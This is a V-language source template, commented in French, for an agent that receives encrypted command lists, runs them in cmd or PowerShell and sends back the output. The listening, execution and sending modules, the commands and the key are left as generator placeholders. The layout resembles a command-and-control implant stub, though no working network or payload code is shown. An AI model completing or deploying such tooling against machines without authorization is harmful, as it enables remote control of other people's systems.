import os

enum ModuleState as u8 {
	unknown		// inconnu
	started		// le module est démarré mais n'a pas commencé
	running		// en cours de traitement
	error		// le module est en erreur
	finish		// le module à terminé son travail
}

enum Module as u8 {
	ecoute = 0
	execution = 1
	envoie = 2
}

// le type de shell dans lequel la commande doit s'exécuter
enum ShellType as u8 {
	cmd
	powershell
}

struct Commande {
	command string
	type_shell ShellType
	id string // id de la commande
}

struct Response{
	output string
	index int // index de la commande dans la liste "commandes_list"
	exit_code int
}

struct SharedVariable {
	agent_identifier string = '<!!id-agent!!>' // de la forme "agent-x" ou x est le numèro de l'agent
	cryptkey []u8 = [<!!cryptkey!!>] // la clé de chiffrement pour le module d'écoute ou d'envoi
	iv []u8 = [<!!init-vecteur!!>] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
	// exemple : iv []u8 = [u8(116), 29, 251, 88, 134, 70, 51, 219, 159, 174, 205, 64, 142, 107, 136, 74]

	number_of_module int = 3

    commandes_list []Commande = [
		<!!commandes!!>
	]
mut:
	execution_commande_list []int
	ip []u8 = [u8(127),0,0,1]
	response_list shared []Response
	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
	module_state_description shared []string = ['','','']
}

fn (shared sv SharedVariable) set_module_state(mod Module,state ModuleState, desc string ){
	lock sv.module_state, sv.module_state_description {
        sv.module_state[mod] = state
		sv.module_state_description[mod] = desc
    }
}

fn main(){
	shared shared_variable := SharedVariable{}
	shared_variable.module_ecoute() // on lance le module écoute
}

<!!ecoute!!>

<!!execution!!>

<!!envoie!!>